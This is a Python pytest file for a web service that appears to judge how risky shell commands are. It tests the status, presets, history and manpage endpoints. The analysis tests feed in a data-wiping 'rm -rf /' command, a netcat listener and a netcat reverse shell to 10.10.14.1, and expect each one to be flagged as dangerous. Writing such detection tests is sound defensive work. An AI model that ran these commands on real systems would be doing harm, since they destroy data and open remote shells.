import os
import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app


@pytest.mark.asyncio
async def test_system_status_endpoint():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.get("/api/status")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "online"
        assert "provider_status" in data
        assert "groq_configured" in data
        assert "tools" in data
        assert "host" in data


@pytest.mark.asyncio
async def test_presets_endpoint():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.get("/api/presets")
        assert response.status_code == 200
        data = response.json()
        assert len(data) >= 5
        assert any("ls -la" in item["command"] for item in data)


@pytest.mark.asyncio
async def test_settings_update_groq():
    orig_key = os.getenv("GROQ_API_KEY", "")
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post(
            "/api/settings",
            json={
                "ai_provider": "groq",
                "groq_api_key": orig_key or "",
                "groq_model": "groq/compound-mini",
            },
        )
        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True


@pytest.mark.asyncio
async def test_analyze_endpoint_safe():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post("/api/analyze", json={"command": "ls -la"})
        assert response.status_code == 200
        data = response.json()
        assert data["command"] == "ls -la"
        assert data["risk_level"] == "SAFE"
        assert data["is_reversible"] is True
        assert "intent" in data
        assert "safecmd" in data
        assert data["safecmd"]["allowed"] is True
        assert "manpage_explanation" in data


@pytest.mark.asyncio
async def test_analyze_endpoint_dangerous():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post("/api/analyze", json={"command": "rm -rf / --no-preserve-root"})
        assert response.status_code == 200
        data = response.json()
        assert data["risk_level"] == "CRITICAL"
        assert data["is_reversible"] is False
        assert len(data["warnings"]) > 0


@pytest.mark.asyncio
async def test_analyze_endpoint_netcat_listener():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post("/api/analyze", json={"command": "nc -lvnp 4444"})
        assert response.status_code == 200
        data = response.json()
        assert data["risk_level"] in ("CAUTION", "CRITICAL")
        assert 4444 in data["network"]["ports_opened"]
        assert data["safecmd"]["allowed"] is False
        assert data["cmdcaliper"]["verdict"] in ("SUSPICIOUS", "HARMFUL")
        assert data["cmdcaliper"]["matched_mitre"] == "T1059.004"
        assert len(data["warnings"]) > 0


@pytest.mark.asyncio
async def test_analyze_endpoint_reverse_shell():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.post("/api/analyze", json={"command": "nc 10.10.14.1 4444 -e /bin/sh"})
        assert response.status_code == 200
        data = response.json()
        assert data["risk_level"] == "CRITICAL"
        assert data["is_reversible"] is False
        assert data["cmdcaliper"]["verdict"] == "HARMFUL"
        assert "10.10.14.1" in data["network"]["outbound_endpoints"] or 4444 in data["network"]["ports_opened"]


@pytest.mark.asyncio
async def test_history_lifecycle():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # Clear
        res = await client.delete("/api/history")
        assert res.status_code == 200

        # List should be empty
        res = await client.get("/api/history")
        assert res.status_code == 200
        assert len(res.json()) == 0


@pytest.mark.asyncio
async def test_manpage_lookup():
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        response = await client.get("/api/manpage/tar -czvf backup.tar.gz")
        assert response.status_code == 200
        data = response.json()
        assert data["command"] == "tar"
        assert "used_flags" in data
        assert len(data["used_flags"]) > 0
